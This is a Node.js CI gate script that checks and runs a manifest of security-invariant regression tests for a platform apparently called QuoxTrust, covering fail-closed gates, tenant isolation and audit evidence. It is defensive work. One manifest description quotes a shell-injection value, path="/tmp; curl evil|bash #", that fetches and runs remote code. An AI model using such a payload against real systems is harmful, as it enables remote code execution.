#!/usr/bin/env node
/**
 * QUOXTRUST conformance gate.
 *
 * The QuoxTrust invariant regressions (witness-binds-action, fail-closed gates,
 * durable evidence, complete mediation) live in two packages' test suites, and
 * BOTH are excluded from the root vitest run — so before this gate NOTHING ran
 * them in CI: a regression that reopened a fail-open gate, an unwitnessed
 * receipt, a silent audit drop, or an ungated effect path would ship green.
 * That is the exact failure mode the standard exists to prevent.
 *
 * This gate makes those invariants a SINGLE required check. It:
 *   1. asserts every invariant regression file still EXISTS (no silent removal
 *      of a guard — deleting the test that pins an invariant fails the gate);
 *   2. RUNS every invariant suite (each contains the positive AND the negative-
 *      candidate assertions — a fail-open / readonly-throw / policy-throw case
 *      that only passes because the real guard rejects the broken candidate);
 *   3. fails the build (exit 1) if any suite is missing or red.
 *
 * It provably refuses a broken candidate: neuter any guard (e.g. make the widget
 * policy gate fall through again, or the ledger claim swallow a write failure)
 * and the owning suite goes red → this gate exits non-zero → CI blocks the merge.
 * Prove it locally with: break a guard, run `npm run gate:trust-conformance`.
 *
 * NOT a substitute for the full "boot the release artifact with real
 * enforcement/DB/auth" harness (that is the next depth rung); it is the always-on
 * floor that stops the known invariant regressions reappearing.
 */
import { execSync } from 'node:child_process';
import { existsSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

// The invariant manifest — the source of truth for what QuoxTrust pins in CI.
// Adding a new invariant regression? Add it here so the gate enforces it.
const MANIFEST = [
  { id: 'T1/T8', property: 'evidence witness binds the effective action (payload commitment)', pkg: 'services/ward',      file: 'test/w4-aee-payload-binding.test.js' },
  { id: 'T7/T8', property: 'the AEE witness binds org_id into the content commitment — a rewritten tenant attribution (or org_id -> NULL, visible to every org) changes the witness hash and is tamper-evident on recompute; org_id is no longer a bare unhashed column the visibility filter trusts blindly (F10, re-scoped from the refuted HITL premise)', pkg: 'services/ward', file: 'test/w-t7-aee-org-binding.test.js' },
  { id: 'T8', property: 'the signed approval_events chain binds action/actor_type/actor_id into the commitment (v2), so rewriting who-decided-what breaks verification; legacy v1 rows verify with their original payload-only scheme and are flagged (F8 — no attacker-writable decision field verifies green)', pkg: 'services/auth', file: '__tests__/approval-events-hash-binding.test.js' },
  { id: 'T1/D1', property: 'canonical action commitments are deterministic + WARD-recomputable',  pkg: 'services/collector', file: 'test/w-t1-canonical-action.test.js' },
  { id: 'T1/D1', property: 'canonical hashing agrees with WARD byte-for-byte (recomputable receipts)', pkg: 'services/collector', file: 'test/w-t1-canonical-action-ward-agreement.test.js' },
  { id: 'T1/D1', property: 'the witness binds the effective action; a rewritten field is detectable + nameable', pkg: 'services/collector', file: 'test/w-t1-canonical-action-witness.test.js' },
  { id: 'T1/D1', property: 'policy reasons about the SAME canonical action (recipient/subject matchable, not the lossy subset)', pkg: 'services/collector', file: 'test/w-t1-policy-unification.test.js' },
  { id: 'T7/T-AUTH', property: 'resident/attached agent identity recognised ONLY from the verified JWT, org-scoped + fail-closed (body-supplied identity never trusted — spoofing boundary)', pkg: 'services/collector', file: 'test/agentIdResolverResident.test.js' },
  { id: 'T7', property: 'the security-engagement + compliance HTTP routes derive org via resolveCallerOrgId: the authenticated identity is authoritative and a caller-supplied org (body/query) is honored ONLY for a trusted service-key caller (FND_..SM0Q). An orgless user token (org_id:null, a real signed state) can NOT substitute a victim org to read/write another tenant or run cross-org scans; it hits the existing 400 instead. 26 routes migrated off the ungated `req.user?.org_id || req.body.org_id` pattern to the single tested helper', pkg: 'services/collector', file: 'test/w-sm0q-caller-org-scope.test.js' },
  { id: 'T7/D4', property: 'the native tool-execute routes + credentialed executors derive org from the AUTHENTICATED identity — a user JWT is locked to its org (body/input org_id never overrides), a caller-supplied org is honoured only for a trusted service-key caller, and ctx.orgId always wins over input.org_id (cross-tenant credential vector, F1)', pkg: 'services/collector', file: 'test/w-t7-tool-execute-org-scope.test.js' },
  { id: 'T4', property: 'native gated bastion tools attach the HITL approval grant on resume (exact command+target); mint-fail is fail-closed (no ungranted exec)', pkg: 'services/collector', file: 'test/w-t4-native-tool-grant.test.js' },
  { id: 'T4/T9', property: 'governed security scans attach the HITL approval grant (exact command+scan-host) on the bastion exec; mint-fail is fail-closed (no ungranted scan) — closes the scan-path complete-mediation gap', pkg: 'services/collector', file: 'test/w-t4-security-scan-grant.test.js' },
  { id: 'T2',    property: 'gates fail closed on policy-store outage (unavailable != no-rule)',  pkg: 'services/collector', file: 'test/w-t2-store-outage-failclosed.test.js' },
  { id: 'T2',    property: 'gates fail closed on approval-SERVICE outage (HITL tool never runs unapproved)', pkg: 'services/collector', file: 'test/w-t2-approval-outage-failclosed.test.js' },
  { id: 'T-AUTH/D2', property: 'tool INPUT never confers authorization at the reference monitor — a fabricated _approvalId cannot bypass require_approval or the store-outage fail-closed; prior authorization is the server-set ctx._claimedApproval handoff (toolResume, single consumption), bound to the same tool+org+effective input; mint/persist failures refuse before any human-visible card (C1)', pkg: 'services/collector', file: 'test/w-t2-refmon-approvalid.test.js' },
  { id: 'T-AUTH/D2', property: 'unknown-agent RBAC fails closed at the native choke — a fabricated ctx.agentId with no DB assignment (or an unavailable lookup) is DENIED, never granted the quox-level toolset; fresh deploys resolve assignments fetch-on-miss instead of guessing', pkg: 'services/collector', file: 'test/w-t2-rbac-unknown-agent.test.js' },
  { id: 'T-AUTH', property: 'the inbox-driven approval RESUME path revalidates approval FRESHNESS before executing (FND_..SRMA): a claimed-but-stale approval (older than the TTL / after a deny-policy change) is refused + finalized expired, not executed — closing the gap where only the legacy poll path checked status.expired; single-use + fingerprint + grant-binding were already safe (replay sweep 4/5 converged)', pkg: 'services/collector', file: 'test/toolResumeFailClosed.test.js' },
  { id: 'T-AUTH/D1', property: 'the approval binding is the CANONICAL effect_id (the single shape shared by policy/approval/execution/evidence), not a parallel reimplementation — a claimed approval authorizes ONLY the same effect_id (object inputs unchanged; scalar/null inputs bind {value:input} instead of the old effective() {}=={} bug that authorized any scalar against an approval for a different one); tool+org early-returns kept so it is never weaker', pkg: 'services/collector', file: 'test/w-d1-approval-effect-id-binding.test.js' },
  { id: 'T3-a',  property: 'a dropped audit-envelope write is accounted, never silent',          pkg: 'services/collector', file: 'test/w-t3-audit-write-failures.test.js' },
  { id: 'T3-b',  property: 'durable execution intent + reconcile-on-restart (no silent loss)',   pkg: 'services/collector', file: 'test/w-t3-execution-ledger.test.js' },
  { id: 'T3-c',  property: 'agent effect paths (email_send/send_notification) fail closed AND record an evidence obligation beside their self-ledger intent (WP-D3: recordObligation at claim, markObligationDelivered on confirmed success only — never on failure), so the reconciler completeness pass covers the selfLedgers domains', pkg: 'services/collector', file: 'test/w-t3-email-send-ledger.test.js' },
  { id: 'T3-d/C2', property: 'EVERY external-effect native tool carries durable intent at the choke (claim keyed by the qtei-1 effect identity before execute; dispatch stamped at the real effect boundary; awaiting_approval is never a dispatch; throw-after-dispatch = outcome_unknown, no blind retry; null/broken ledger store REFUSES; the fail-closed sweep blocks unreviewed outward tools)', pkg: 'services/collector', file: 'test/w-t3-external-effect-ledger.test.js' },
  { id: 'T1/C3', property: 'qtei-1 effect identity is stable across the authorization lifecycle (proposal == resumed input; excludes control-field names + actor identity) and rides the evidence commitment as the intent-receipt join key', pkg: 'services/collector', file: 'test/w-t1-effect-identity.test.js' },
  { id: 'T3-e/C2', property: 'the X decide path (real dispatch, outside the choke) settles its cross-domain intent honestly — thread N-of-M = partial, throw-after-dispatch = outcome_unknown never failed (no blind retry), broken store refuses before any outward call — and records an evidence obligation delivered on confirmed success ONLY (partial/outcome_unknown leave it owed; WP-D3)', pkg: 'services/collector', file: 'test/w-t3-x-decision-ledger.test.js' },
  { id: 'D6/B5', property: 'a privacy toggle can NEVER erase fact-of-execution — content-free execution receipts (system.tools/system.aocl channels) store + witness regardless of DISABLE_TRANSCRIPT_STORAGE; transcript-class envelopes still honor it', pkg: 'services/collector', file: 'test/w-d6-mandatory-evidence.test.js' },
  { id: 'T3-f/D3', property: 'the connector bridge ledger gate covers every EFFECT-VERB connector tool (shared classifier lib/effectVerbs.js, same source the w-t9 sweep consumes — no drift), not only the requiresApproval subset', pkg: 'services/collector', file: 'test/w-t3-bridge-ledger-broadening.test.js' },
  { id: 'D1/WP4', property: 'the WARD tag carries the qtei-1 effect_id so the durable-intent row joins to the witnessed receipt on an EXTERNALLY-readable surface (no payload decryption needed), tamper-checkable against the payload_commit-covered commitment', pkg: 'services/ward', file: 'test/w-d1-effect-id-tag.test.js' },
  { id: 'T9/D4', property: 'widget effect gate fails closed on policy exception (mediation)',    pkg: 'services/collector', file: 'test/w-t9-widget-policy-failclosed.test.js' },
  { id: 'T9/D4', property: 'org GOV-4 policy governs the WIDGET path too (deny/require_approval/outage → block; a public widget is not a bypass of the shared boundary)', pkg: 'services/collector', file: 'test/w-t9-widget-gov-mediation.test.js' },
  { id: 'T9/D4', property: 'connector tools pass GOV-4 policy at the shared choke (5.1 closed)',  pkg: 'services/collector', file: 'test/w-t9-connector-policy-mediation.test.js' },
  { id: 'T7/D4', property: 'plugin TOOL execution is org-entitlement gated at parity with the proxy path — a governed plugin licensed for one org cannot be executed by another via the global tool registry; fail-closed; the trusted internal/no-org path is unchanged (F3)', pkg: 'services/collector', file: 'test/pluginGatewayToolLicense.test.js' },
  { id: 'T5/D4', property: 'third-party plugin RUNTIME ISOLATION (F2): the frame host runs UNTRUSTED plugin code in an opaque-origin sandbox (allow-scripts, NEVER allow-same-origin) with connect-src \'none\' (no network, no external code); only a postMessage from the frame\'s own contentWindow on the minted channel is accepted (a forged source/channel is dropped); the host mediator attaches org itself (a plugin-supplied org is ignored) and getUser never returns a token. activateThirdPartyPlugin routes every non-official plugin here — it can no longer reach the <script>-injection path (official signature-verified bundles keep the trusted in-parent path). Real-browser proofs: pluginFrameHost.browser.mjs (containment) + pluginFrameHost.render.browser.mjs (functional render). RESIDUAL: iframe CPU/memory not capped; marketplace install-flow live QA pending.', pkg: '.', file: 'src/services/pluginFrameHost.test.js' },
  { id: 'T5/D4', property: 'the isolated plugin\'s DECLARATIVE surfaces wire as namespaced third-party routes whose element renders the frame (never a plugin-supplied React component), never a root route for an untrusted plugin (F2 P4)', pkg: '.', file: 'src/services/pluginFrameSurfaces.test.js' },
  { id: 'T9/D4', property: 'plugin-backend EFFECT tools are approval-gated by DEFAULT at the shared GOV-4 choke (F5): classifyPluginToolEffect is the server-side authority (an effect-verb name is always an effect, undeclared is an effect fail-safe, a plugin label can add restriction but never downgrade); a plugin effect tool with no explicit org policy and no bound prior approval → require_approval; a plugin READ tool → allow (no first-party read regression); an explicit org deny still governs; native/connector tools (no plugin meta) are unaffected; mint failure is fail-closed', pkg: 'services/collector', file: 'test/w-f5-plugin-effect-gate.test.js' },
  { id: 'T9/D4', property: 'every effect-verb tool is in a reviewed gate bucket (no ungated effect)', pkg: 'services/collector', file: 'test/w-t9-effect-coverage.test.js' },
  { id: 'T5/T9', property: 'remote_ssh requires human approval by default for any command that is NOT a provably read-only allowlisted command (FND_..SCFP): arbitrary shell from model-filled input.command is gated (withApprovalGate) like docker/proxmox, an allowlisted read (uptime/journalctl/...) runs directly — model output can no longer exec arbitrary shell via a vault SSH credential with no human in the loop', pkg: 'services/collector', file: 'test/remoteSsh.test.js' },
  { id: 'T5/T9', property: 'db_query WRITE (allow_write:true) requires human approval by default (FND_..SCFP): a model-filled write query is gated, the read-only path runs directly — model output can no longer run arbitrary SQL writes via a vault DB credential with no human in the loop', pkg: 'services/collector', file: 'test/dbQuery.test.js' },
  { id: 'T5/T9', property: 'the arbitrary shell/SQL tools (remote_ssh, ssh_exec, db_query) are UNCONDITIONALLY gated via AGENT_ALWAYS_PROPOSE_TOOLS (FND_..SF9C): the wrap holds for ANY agent with NO org policy configured (isAgentGated true, synchronous, no DB to fail-open on) — closes the governance-theatre gap where withApprovalGate was present but the tool was registered in no gating mechanism, and where ssh_exec (a second bastion-shell doorway) was not wrapped at all. Prior SCFP approval path was theatre; this pins the real boundary + resume-path execution', pkg: 'services/collector', file: 'test/w-sf9c-shell-sql-always-propose.test.js' },
  { id: 'T5/D4', property: 'model-supplied fields interpolated into a bastion shell command are strictly allowlist-validated and REFUSED on any shell metacharacter (FND_..SGFV): system_admin (path/unit/priority/since/user) and docker_fleet_logs/docker_fleet_stats (container_id) can no longer be turned into RCE via injection (e.g. path="/tmp; curl evil|bash #"); reads stay usable with clean input. shellSafe is a positive allowlist per field kind, never a denylist', pkg: 'services/collector', file: 'test/w-sgfv-shell-injection.test.js' },
  { id: 'T5/D4', property: 'the bastion_ssh executor (a PARALLEL shadow of the native fleet tools, running off entity-tool args) validates every model-supplied field at its builder-dispatch gate and REFUSES injection (FND_..SK5C): docker.logs/system.*/network.*/security.audit/proxmox.* can no longer be turned into ungated RCE via a shadow code path; quoxagent.install validates hostId. Same fields/discipline as SGFV/SHGH, different code path (the parallel-enforcement bypass the native fix did not reach)', pkg: 'services/collector', file: 'test/w-sk5c-bastion-ssh-injection.test.js' },
  { id: 'T9/D4', property: 'docker_extended is read-only: it REFUSES container mutations (restart/start/stop/kill) with a pointer to the approval-gated docker_fleet_container_action (FND_..SJS9) — no ungated mutation via a read tool', pkg: 'services/collector', file: 'test/toolExecutorsDocker.test.js' },
  { id: 'T5/D4', property: 'IMMUNE SYSTEM: the complete set of collector lib files invoking callBastion is pinned + review-status tracked — a NEW bastion caller or a NEW call site FAILS CI, forcing an injection review (shellSafe) before merge, and validated files cannot silently drop the shellSafe import. Closes the name-based-coverage blind spot that let ssh_exec + the injection class slip; the guard itself surfaced skillPackInstaller.js which manual grep missed. 6+1 files remain needs-audit (tracked)', pkg: 'services/collector', file: 'test/w-callbastion-coverage.test.js' },
  { id: 'T5/D4', property: 'the shell-injection class is closed across ALL callBastion sites (FND_..SHGH, census of 10 sites): the remaining 7 beyond SGFV are validated+refused at their executor boundary — network_check (target/dns_type/ports), docker_extended (container/since/grep), ssl_certificates (domain), security_audit (event_types/org_id/db_path), docker_fleet_container_action (container_id), proxmox_vm_snapshot (node/vmid), proxmox_vm_clone (newid/template_vmid). Each refuses a shell-metachar payload WITHOUT calling bastion; clean values still run', pkg: 'services/collector', file: 'test/w-shgh-shell-injection-class.test.js' },
  { id: 'T8/D6', property: 'VOLT GOLD certification requires an IDENTITY-verified (pinned-key) signature (FND_..SC1W): a self-consistent bundle-EMBEDDED (self-signed) signature verifies as signature_trust=embedded and does NOT earn the GOLD "identity-verified" badge (fail-closed if no pinned key); a foreign key is signature_trust=none. Source ratchet on the GOLD NO_SIGNATURE gate + real-Ed25519 behavioral tests', pkg: 'services/collector', file: 'test/w-t8-volt-cert-pinned.test.js' },
  { id: 'T1/D1', property: 'a WARD witness call that cannot run (hooks not initialised — boot window, or a permanent load failure) is ACCOUNTED per type + surfaced via wardHooksStatus (wired into /health, loadError → degraded), never a SILENT no-op (FND_..SB5J): the tamper-evidence layer can no longer vanish untraced while the primary AEE row writes green', pkg: 'services/ward', file: 'test/w-witness-drop-accounting.test.js' },
  { id: 'T7', property: 'the contactability consent-GRANT route scopes org by the AUTHENTICATED identity (resolveRequestOrgId), not a caller-supplied x-org-id header first (FND_..SAGZ) — source ratchet against reintroducing the header-first anti-pattern that let a user write a consent policy into another org (which the tripwire path reads to decide who to auto-dial)', pkg: 'services/collector', file: 'test/w-t7-contactability-org-scope.test.js' },
  { id: 'T2', property: 'the pre-LLM governance gate (L1 identity / injection / PII / L3 policy) FAILS CLOSED on a throw (FND_..S9XR): lib/preLLMGate refuses 503 governance_unavailable instead of proceeding unscreened — /chat/resolve-plan used to swallow the throw and fall through (fail-open) while its /chat/stream + unified-provider siblings fail closed; a pipeline DENY still returns its own status', pkg: 'services/collector', file: 'test/w-prellm-gate-failclosed.test.js' },
  { id: 'T2', property: 'the 4-eyes policy-change gate FAILS CLOSED (FND_..S9DJ): when enforce_4eyes is set, updatePolicy stages a pending-approval entry and does not touch the policies table; if staging (appendHistoryEntry) THROWS, the change is REFUSED (throws FOUR_EYES_STAGING_FAILED), never applied by the first actor with approval_state=auto — an audit-write failure is not a second approver (was a dual-control bypass inducible by forcing a history-write error)', pkg: 'services/collector', file: 'test/w-4eyes-fail-closed.test.js' },
  { id: 'T6/T9', property: 'the CommanderQ tripwire\'s outbound telephony + notification pass the org GOV-4 policy store (FND_..S8Q8): an explicit org DENY policy blocks the outbound call/notify (the previously-missing central lever over a consequential external sink), routed through the SAME checkStorePolicies the reference monitor uses; an incident alert is never SUPPRESSED by require_approval or a policy-store outage (those proceed but are recorded); consent + cooldown + deny-by-default remain primary', pkg: 'services/collector', file: 'test/w-tripwire-outbound-governance.test.js' },
  { id: 'T9/D4', property: 'every dangerous-marker HTTP effect route sits in a reviewed mediation bucket (route-level ratchet: an ungated effect route cannot ship green; KNOWN_GAP entries carry their WP3 reroute item)', pkg: 'services/collector', file: 'test/w-t9-route-mediation-coverage.test.js' },
  { id: 'T9/D4', property: 'a policy REFUSAL is witnessed, not silent — both chokes emit ops.tool.denied/aocl.tool.denied on the mandatory-evidence channel, binding the canonical action the policy evaluated; denied-vs-never-attempted is provable', pkg: 'services/collector', file: 'test/w-d4-deny-evidence.test.js' },
  { id: 'T9/D4/B6', property: 'the auth service\'s parallel tool executor stays RETIRED (410 before any dispatch; zero consumers verified before disabling) — one boundary, no second unmediated executor', pkg: 'services/auth', file: '__tests__/agent-tools-executor-retired.test.js' },
  { id: 'T-AUTH/WP3.4b', property: 'resident identities are GOVERNED assignment principals (case-insensitive resolve, ACTIVE only, lowercased key; cross-org and revoked refuse) — tools by explicit assignment, never by fallback', pkg: 'services/auth', file: '__tests__/resident-assignment-key.test.js' },
  { id: 'D5/637', property: 'the PUBLIC verification surface is skeptic-reachable and bounded — query-form chain verify (no encoding trap), public single-receipt inclusion proof (verifyReceipt made public), shared rate limit, oversized-segment refusal (no unauthenticated unbounded hash walk)', pkg: 'services/collector', file: 'test/w-d5-public-verify.test.js' },
  { id: 'T1/T8/WP4.2', property: 'the evidence trail is BIDIRECTIONALLY reconciled + anchored — settled effects must carry a signed-tip-provable receipt (tag-independent discovery from the durable ledger), WARD windows recompute against watermark+back-samples, decrypted-source divergence raises incidents, and checked:0 is never clean', pkg: 'services/collector', file: 'test/w-t4-evidence-reconciler.test.js' },
  { id: 'T3/D1/WP4.1b', property: 'a receipt owed is a durable debt — external-effect claims record an evidence obligation beside the intent (content-free snapshot), confirmed storage settles it, boot re-emits owed receipts WITHOUT replaying the effect, and the debt is visible as receipts_owed', pkg: 'services/collector', file: 'test/w-t4-evidence-outbox.test.js' },
  { id: 'T9/D4', property: 'a governance DENY on the gold/internal execute routes is witnessed as ops.tool.denied (choke force-emits past the caller-emits-own opt-out) and never mislabeled as a success — the route early-returns _governanceDenied instead of emitting an execution receipt (live 2026-09-28 defect: a deny recorded as ops.tool.executed)', pkg: 'services/collector', file: 'test/w-d4-deny-receipt-gold-paths.test.js' },
  { id: 'T9/D6', property: 'a registered agent cannot execute a native tool without a witnessed evidence receipt — executeTool emits at the choke by default (success/null/throw), binding the T1 canonical action; the 5 gold callers that emit their own opt out', pkg: 'services/collector', file: 'test/w-d6-choke-evidence.test.js' },
  { id: 'T9/D6', property: 'connector executions are witnessed at PARITY with native — the bridge emits the AEE/WARD receipt beside VOLT for any connector effect that runs to completion (success/failure), deduped by ctx._callerEmitsToolEvidence', pkg: 'services/collector', file: 'test/w-d6-connector-evidence.test.js' },
  { id: 'T1/D3', property: '/aee/sync WITNESSES (and VOLT-ingests) an envelope ONLY IF it is storable — one shared predicate (lib/aeeEnvelopeShape.cjs) governs insert, witness AND VOLT ingest, so a malformed-but-id\'d envelope can never become an orphan WARD entry with no readable source (the id-only witness check that produced ~7K within-retention orphans is gone)', pkg: 'services/collector', file: 'test/w-d3-aee-sync-witness-guard.test.js' },
  { id: 'T1/D3', property: 'retention GC never deletes a WITNESSED source envelope — both prune paths exempt rows present in ward_entries (kind-pinned NOT EXISTS) and FAIL-SAFE skip entirely when ward.db cannot be attached (over-retain, never prune evidence blind); retention is a floor, not a ceiling, and a witness is a promise the source survives (fixes the ~27K within-retention loss from short per-intent TTLs)', pkg: 'services/collector', file: 'test/w-d3-retention-witnessed-exempt.test.js' },
  { id: 'T2/T7/D2', property: 'NotesQ governed entry point (AQ-9D): the licence check is AWAITED and fails closed before quoxbrain is touched; X-User-Is-Admin and author_kind are derived server-side from httpAuth (isHumanAdmin/deriveActorType), never from a client header/body, on EVERY mutation incl. delete; envelopes never carry note content. (quoxbrain-side isolation pins are node:test and not yet gated: known debt, STATUS_AND_LIMITS_NOTESQ.md)', pkg: 'services/collector', file: 'test/notesqApi.test.js' },
  { id: 'CQ/1', property: 'ContactsQ evidence carries no PII: every quox.contacts.* envelope across create/resolve/mint/redeem/send/touchpoint/fact/consent/merge/import/erase/history is built from a closed allowlist; no raw identifier, name, notes, reason or summary appears in any payload (sentinel scan of all envelopes + allowlist key check)', pkg: 'services/collector', file: 'test/w-cq-no-pii-evidence.test.js' },
  { id: 'CQ/2', property: 'ContactsQ tenant isolation: org B cannot read, update, resolve, search, lease, redeem, revoke or erase org A\'s contacts (HTTP and agent-tool paths); the same identifier has a different blind index in each org', pkg: 'services/collector', file: 'test/w-cq-org-isolation.test.js' },
  { id: 'CQ/3', property: 'ContactsQ release is service-only: agent/user/admin get 403 on lease redeem and the dial-queue (no in-process bypass from the wire); a lease is single use (second and concurrent redeems 410/one release); a DNC added after mint blocks the redeem and revokes the lease', pkg: 'services/collector', file: 'test/w-cq-service-only-redeem.test.js' },
  { id: 'CQ/4', property: 'ContactsQ standing grants only skip the approval gate when policy says allow: approval_required (minor) and deny (do_not_call/do_not_email) always become a human proposal with no lease and no grant use; no caller-supplied input field can claim a grant (reservation bound to the input object, org and agent)', pkg: 'services/collector', file: 'test/w-cq-grant-only-on-allow.test.js' },
  { id: 'CQ/5', property: 'ContactsQ consent history is append-only: UPDATE/DELETE on contact_consents are rejected by DB trigger, grants/withdrawals/objections append while older rows stay byte-identical, erasure keeps the rows, and no production source mutates the table', pkg: 'services/collector', file: 'test/w-cq-consents-append-only.test.js' },
  { id: 'CQ/6', property: 'ContactsQ erasure is a crypto-shred: the wrapped DEK exists in no table after erase and no ciphertext opens, no plaintext of the subject remains, and the tombstone blocks re-add (409 identifier_erased), auto-candidate, resolve and import', pkg: 'services/collector', file: 'test/w-cq-crypto-shred-erasure.test.js' },
  { id: 'CQ/7', property: 'Agents never receive raw identifiers: every contacts_* tool result (resolve/find/search/dial/send/context/failure/pending/cross-org) is mask-only while the transport receives the real value; a new contacts_* tool not in the sweep fails the gate', pkg: 'services/collector', file: 'test/w-cq-agent-masked-only.test.js' },
];

function log(m) { console.log(m); }

// Step 1 — existence check (no silent removal of a guard).
const missing = MANIFEST.filter((m) => !existsSync(path.join(ROOT, m.pkg, m.file)));
if (missing.length) {
  log('\n⛔ QUOXTRUST conformance FAILED — invariant regression(s) removed:');
  for (const m of missing) log(`   ✖ ${m.id}: ${m.pkg}/${m.file} MISSING (${m.property})`);
  log('\nAn invariant is only pinned while its regression exists. Restore it or, if the');
  log('invariant genuinely moved, update the manifest deliberately with the reason.\n');
  process.exit(1);
}

// Step 2 — run every invariant suite in its own package.
const byPkg = new Map();
for (const m of MANIFEST) {
  if (!byPkg.has(m.pkg)) byPkg.set(m.pkg, []);
  byPkg.get(m.pkg).push(m.file);
}

let failed = false;
for (const [pkg, files] of byPkg) {
  log(`\n🔒 QUOXTRUST │ ${pkg} │ ${files.length} invariant suite(s)`);
  try {
    execSync(`npx vitest run ${files.join(' ')}`, {
      cwd: path.join(ROOT, pkg),
      stdio: 'inherit',
      env: { ...process.env, SKIP_DOCKER: '1', CI: 'true' },
    });
  } catch {
    failed = true;
    log(`   ✖ ${pkg}: invariant suite(s) RED`);
  }
}

if (failed) {
  log('\n⛔ QUOXTRUST conformance FAILED — a trust invariant regressed. Merge blocked.\n');
  process.exit(1);
}

log(`\n✔ QUOXTRUST conformance PASSED — ${MANIFEST.length} invariants held:`);
for (const m of MANIFEST) log(`   ✔ ${m.id.padEnd(6)} ${m.property}`);
log('');
process.exit(0);
